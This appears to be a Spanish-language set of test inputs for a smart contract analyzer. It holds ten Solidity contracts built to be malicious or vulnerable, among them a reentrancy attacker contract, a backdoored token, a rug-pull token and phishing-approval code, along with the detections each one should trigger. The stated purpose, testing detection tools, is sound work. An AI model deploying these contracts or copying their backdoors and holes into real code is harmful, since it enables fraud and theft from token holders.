# Contratos Maliciosos para Pruebas

Aquí tienes una colección de contratos inteligentes maliciosos reales y simulados para probar el Smart Contract Analyzer.

## 1. Honeypot Contract

```solidity
// Honeypot - Bloquea transferencias después de cierto monto
pragma solidity ^0.8.0;

contract HoneypotToken {
    mapping(address => uint) public balances;
    mapping(address => bool) public blacklisted;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        balances[owner] = 1000000 * 10**18;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        require(!blacklisted[msg.sender], "Blacklisted");
        require(balances[msg.sender] >= amount);
        
        // Honeypot: Solo permite transferencias si el valor es 0
        require(msg.value == 0, "No ETH allowed");
        
        // Honeypot: Bloquea transferencias grandes
        require(amount <= 100 * 10**18, "Transfer too large");
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function addToBlacklist(address account) public {
        require(msg.sender == owner, "Only owner");
        blacklisted[account] = true;
    }
}
```

## 2. Rug Pull Contract

```solidity
// Rug Pull - Owner puede drenar todos los fondos
pragma solidity ^0.8.0;

contract RugPullToken {
    mapping(address => uint) public balances;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        balances[owner] = 1000000 * 10**18;
    }
    
    function transferOwnership(address newOwner) public {
        require(msg.sender == owner, "Only owner");
        owner = newOwner;
    }
    
    function emergencyWithdraw() public {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }
    
    function drainTokens() public {
        require(msg.sender == owner, "Only owner");
        balances[owner] += balances[address(this)];
        balances[address(this)] = 0;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
}
```

## 3. Reentrancy Attack Contract

```solidity
// Reentrancy - Vulnerabilidad clásica
pragma solidity ^0.8.0;

contract ReentrancyVulnerable {
    mapping(address => uint) public balances;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount);
        
        // Vulnerabilidad: Llamada externa antes de actualizar el estado
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= amount;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

// Attacker Contract
contract ReentrancyAttacker {
    ReentrancyVulnerable public target;
    uint public amount;
    
    constructor(address _target) {
        target = ReentrancyVulnerable(_target);
    }
    
    function attack() public payable {
        amount = msg.value;
        target.deposit{value: msg.value}();
        target.withdraw(msg.value);
    }
    
    fallback() external payable {
        if (address(target).balance > 0) {
            target.withdraw(amount);
        }
    }
}
```

## 4. Flash Loan Attack Contract

```solidity
// Flash Loan Attack - Manipulación de precios
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract FlashLoanAttacker {
    IUniswapV2Pair public pair;
    address public token;
    address public weth;
    
    constructor(address _pair, address _token, address _weth) {
        pair = IUniswapV2Pair(_pair);
        token = _token;
        weth = _weth;
    }
    
    function flashLoanAttack(uint amount) public {
        pair.swap(amount, 0, address(this), abi.encodeWithSignature("executeAttack()"));
    }
    
    function executeAttack() external {
        // Manipular el precio del token
        // Vender tokens para bajar el precio
        // Comprar barato con flash loan
        // Devolver flash loan con ganancia
    }
    
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "Only pair can call");
        this.executeAttack();
    }
}
```

## 5. MEV Manipulation Contract

```solidity
// MEV Manipulation - Manipulación de block.timestamp
pragma solidity ^0.8.0;

contract MEVManipulator {
    mapping(address => uint) public lastTrade;
    mapping(address => bool) public authorized;
    
    constructor() {
        authorized[msg.sender] = true;
    }
    
    function manipulateTimestamp() public view returns (uint) {
        // Usar timestamp para manipulación
        return block.timestamp % 100;
    }
    
    function sandwichAttack(address target, uint amount) public payable {
        require(authorized[msg.sender], "Not authorized");
        
        uint timestamp = block.timestamp;
        if (timestamp % 2 == 0) {
            // Ejecutar sandwich attack
            payable(target).call{value: amount}("");
        }
    }
    
    function authorize(address user) public {
        authorized[user] = true;
    }
}
```

## 6. Backdoor Contract

```solidity
// Backdoor - Funciones ocultas maliciosas
pragma solidity ^0.8.0;

contract BackdoorToken {
    mapping(address => uint) public balances;
    address public owner;
    address public backdoor;
    
    constructor() {
        owner = msg.sender;
        backdoor = msg.sender;
        balances[owner] = 1000000 * 10**18;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    // Backdoor function - parece normal pero es maliciosa
    function emergencyMint(address to, uint amount) public {
        require(msg.sender == owner || msg.sender == backdoor, "Not authorized");
        balances[to] += amount;
    }
    
    // Backdoor oculto
    function backdoorTransfer(address from, address to, uint amount) public {
        require(msg.sender == backdoor, "Backdoor only");
        require(balances[from] >= amount);
        balances[from] -= amount;
        balances[to] += amount;
    }
    
    function setBackdoor(address newBackdoor) public {
        require(msg.sender == backdoor, "Backdoor only");
        backdoor = newBackdoor;
    }
}
```

## 7. Unlimited Mint Contract

```solidity
// Unlimited Mint - Mint infinito sin control
pragma solidity ^0.8.0;

contract UnlimitedMintToken {
    mapping(address => uint) public balances;
    uint public totalSupply;
    address public owner;
    
    constructor() {
        owner = msg.sender;
    }
    
    function mint(address to, uint amount) public {
        require(msg.sender == owner, "Only owner");
        // Sin límite de supply
        balances[to] += amount;
        totalSupply += amount;
    }
    
    function unlimitedMint(uint amount) public {
        require(msg.sender == owner, "Only owner");
        balances[msg.sender] += amount;
        totalSupply += amount;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        require(balances[msg.sender] >= amount);
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
}
```

## 8. Blacklist Contract

```solidity
// Blacklist - Control de acceso malicioso
pragma solidity ^0.8.0;

contract BlacklistToken {
    mapping(address => uint) public balances;
    mapping(address => bool) public blacklisted;
    address public owner;
    
    constructor() {
        owner = msg.sender;
        balances[owner] = 1000000 * 10**18;
    }
    
    function transfer(address to, uint amount) public returns (bool) {
        require(!blacklisted[msg.sender], "Sender blacklisted");
        require(!blacklisted[to], "Recipient blacklisted");
        require(balances[msg.sender] >= amount);
        
        balances[msg.sender] -= amount;
        balances[to] += amount;
        return true;
    }
    
    function addToBlacklist(address account) public {
        require(msg.sender == owner, "Only owner");
        blacklisted[account] = true;
    }
    
    function removeFromBlacklist(address account) public {
        require(msg.sender == owner, "Only owner");
        blacklisted[account] = false;
    }
    
    function massBlacklist(address[] memory accounts) public {
        require(msg.sender == owner, "Only owner");
        for (uint i = 0; i < accounts.length; i++) {
            blacklisted[accounts[i]] = true;
        }
    }
}
```

## 9. Phishing Contract

```solidity
// Phishing - Aprobaciones maliciosas
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract PhishingContract {
    address public owner;
    IERC20 public targetToken;
    
    constructor(address _token) {
        owner = msg.sender;
        targetToken = IERC20(_token);
    }
    
    // Función de phishing - parece legítima
    function approveTokens(uint amount) public {
        require(targetToken.approve(owner, amount), "Approval failed");
    }
    
    // Phishing con approve y transfer
    function approveAndTransfer(address victim, uint amount) public {
        require(msg.sender == owner, "Only owner");
        targetToken.transferFrom(victim, owner, amount);
    }
    
    // Falsa función de seguridad
    function secureApprove(address spender, uint amount) public {
        // En realidad aprueba al owner
        targetToken.approve(owner, amount);
    }
    
    function withdrawTokens() public {
        require(msg.sender == owner, "Only owner");
        uint balance = targetToken.balanceOf(address(this));
        targetToken.transfer(owner, balance);
    }
}
```

## 10. Gas Manipulation Contract

```solidity
// Gas Manipulation - Manipulación de gas para ataques
pragma solidity ^0.8.0;

contract GasManipulator {
    mapping(address => uint) public balances;
    bool public emergency;
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }
    
    function withdrawWithGasManipulation(uint amount) public {
        require(balances[msg.sender] >= amount);
        
        // Manipulación de gas
        uint gasStart = gasleft();
        
        if (gasStart > 50000 && !emergency) {
            emergency = true;
            (bool success, ) = msg.sender.call{value: amount}("");
            require(success, "Transfer failed");
            balances[msg.sender] -= amount;
            emergency = false;
        }
    }
    
    function gasGriefing() public payable {
        // Consumir gas innecesariamente
        for (uint i = 0; i < 1000; i++) {
            balances[msg.sender] = i;
        }
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```

## Cómo Usar estos Contratos

1. **Copia el código** del contrato que quieres probar
2. **Pégalo en el Smart Contract Analyzer**
3. **Haz clic en "Analizar Contrato"**
4. **Observa los resultados** en las diferentes pestañas

## Resultados Esperados

- **Honeypot**: Detectará bloqueos de transferencia y blacklist
- **Rug Pull**: Identificará funciones de ownership y emergency withdraw
- **Reentrancy**: Marcará llamadas .call antes de actualizar estado
- **Flash Loan**: Detectará manipulación de precios y swap patterns
- **MEV**: Identificará uso de block.timestamp y manipulación
- **Backdoor**: Encontrará funciones ocultas y transferencias no autorizadas
- **Unlimited Mint**: Detectará mint sin límites de supply
- **Blacklist**: Identificará funciones de control de acceso
- **Phishing**: Marcará aprobaciones maliciosas y transferencias
- **Gas Manipulation**: Detectará manipulación de gas y griefing

## Fuentes de Contratos Reales

Para más ejemplos reales, puedes visitar:

1. **Etherscan** - Busca contratos con warnings de seguridad
2. **GitHub** - Repositorios de contratos vulnerables para testing
3. **Immunefi** - Reportes de bugs y exploits reales
4. **Smart Contract Weakness Classification (SWC) Registry**
5. **ConsenSys Smart Contract Best Practices**

## Advertencia

Estos contratos son **únicamente para fines educativos y de testing**. No los despliegues en mainnet ni los uses para actividades maliciosas.
